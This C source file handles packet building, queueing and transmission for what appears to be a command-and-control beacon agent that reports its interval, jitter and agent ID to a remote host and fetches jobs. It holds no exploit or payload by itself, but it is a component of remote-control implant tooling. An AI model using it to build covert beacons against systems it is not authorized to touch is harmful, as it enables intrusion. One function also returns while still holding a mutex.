#include "packet.h"
#include <pthread.h>

struct packet_struct *packet_create(uint32_t command_id)
{
    struct packet_struct *packet = NULL;

    packet = malloc(sizeof(struct packet_struct));
    if (packet == NULL)
    {
        DLX(3, printf("\tAlloc packet(command_id : %d) error\n", command_id));
        return packet;
    }
    memset(packet, 0, sizeof(struct packet_struct));

    packet->command_id = command_id;
    packet->destroy = 1; /* 1 :destroy this package after Transmit */
    packet->next = NULL;

    return packet;
}

struct packet_struct *packet_create_with_metadata(uint32_t command_id)
{
    struct packet_struct *packet = packet_create(command_id);

    packet_add_uint32(packet, 0); // package length
    packet_add_uint32(packet, packet->command_id);

    return packet;
}

void packet_destroy(struct packet_struct *packet)
{
    if (packet == NULL)
        return;
    if (packet->buffer != NULL)
        free(packet->buffer);

    free(packet);
}

void packet_add_uint16(struct packet_struct *packet, uint16_t data)
{
    if (!packet)
        return;
    void *buffer;

    buffer = realloc(packet->buffer, packet->length + sizeof(data));
    if (buffer == NULL)
    {
        DLX(3, printf("\tRealloc packet(command_id : %d) error\n", packet->command_id));
        return;
    }
    packet->buffer = buffer;

    uint16_t tmp = htons(data);
    memcpy(packet->buffer + packet->length,&tmp,sizeof(tmp));
    packet->length += sizeof(data);
}

void packet_add_uint32(struct packet_struct *packet, uint32_t data)
{
    if (!packet)
        return;
    void *buffer;

    buffer = realloc(packet->buffer, packet->length + sizeof(data));
    if (buffer == NULL)
    {
        DLX(3, printf("\tRealloc packet(command_id : %d) error\n", packet->command_id));
        return;
    }
    packet->buffer = buffer;

    uint32_t tmp = htonl(data);
    memcpy(packet->buffer + packet->length,&tmp,sizeof(tmp));
    packet->length += sizeof(data);
}

void packet_add_bytes(struct packet_struct *packet, void *data, uint32_t size)
{
    if (!packet)
        return;
    void *buffer;
    buffer = realloc(packet->buffer, packet->length + size);
    if (buffer == NULL)
    {
        DLX(3, printf("\tRealloc packet(command_id : %d) error\n", packet->command_id));
        return;
    }
    packet->buffer = buffer;

    memcpy(packet->buffer + packet->length, data, size);
    packet->length += size;
}

int packet_transmit_now(char *host,int port,struct packet_struct *packet, void **response, uint32_t *response_size)
{
    if (packet == NULL)
    {
        DLX(3, printf("\tPacket is emtpy\n"));
        return -1;
    }

    if (packet->buffer == NULL)
    {
        DLX(3, printf("\tPacket buffer is emtpy\n"));
        return -1;
    }

    // write packet length to buffer
    *(uint32_t *)packet->buffer = htonl(packet->length - sizeof(uint32_t));

    DLX(3,printf("\tTransport packet (command id: %d) \n",packet->command_id));
    transport_send(host,port,packet->buffer, packet->length, response, response_size);
    
    if (packet->destroy)
    {
        packet_destroy(packet);
    }

    return 0;
}

void packet_transmit(BEACONINFO *beaconInfo,struct packet_struct *packet)
{

    struct packet_struct *list = NULL;

    pthread_mutex_lock(&beaconInfo->packets_mutex);

    if(packet == NULL) return;

    if(beaconInfo->packets == NULL){
        beaconInfo->packets = packet;
    }else{
        list = beaconInfo->packets;
        while(list->next != NULL){
            list = list->next;
        }
        list->next = packet;
    }

    pthread_mutex_unlock(&beaconInfo->packets_mutex);
}

int packet_transmit_all(BEACONINFO *beaconInfo,void **response, uint32_t *response_size)
{
    struct packet_struct *packet = packet_create_with_metadata(COMMAND_GET_JOB);
    struct packet_struct *pkt = NULL;
    
    pthread_mutex_lock(&beaconInfo->packets_mutex);

    pkt = beaconInfo->packets;

    packet_add_uint32(packet, beaconInfo->interval);
	packet_add_uint32(packet, beaconInfo->jitter);
    packet_add_uint32(packet, beaconInfo->agentID);

    while(pkt){
        packet_add_uint32(packet,pkt->command_id);
        packet_add_uint32(packet,pkt->length);
        packet_add_bytes(packet,pkt->buffer,pkt->length);

        pkt = pkt->next;
    }

    // write packet length to buffer
    *(uint32_t *)packet->buffer = htonl(packet->length - sizeof(uint32_t));
    transport_send(beaconInfo->host,beaconInfo->port,packet->buffer, packet->length, response, response_size);
    
    pkt = beaconInfo->packets;
    while(pkt != NULL){
        beaconInfo->packets = pkt->next;
        packet_destroy(pkt);
        pkt = beaconInfo->packets;
    }

    packet_destroy(packet);

    pthread_mutex_unlock(&beaconInfo->packets_mutex);

    return 0;
}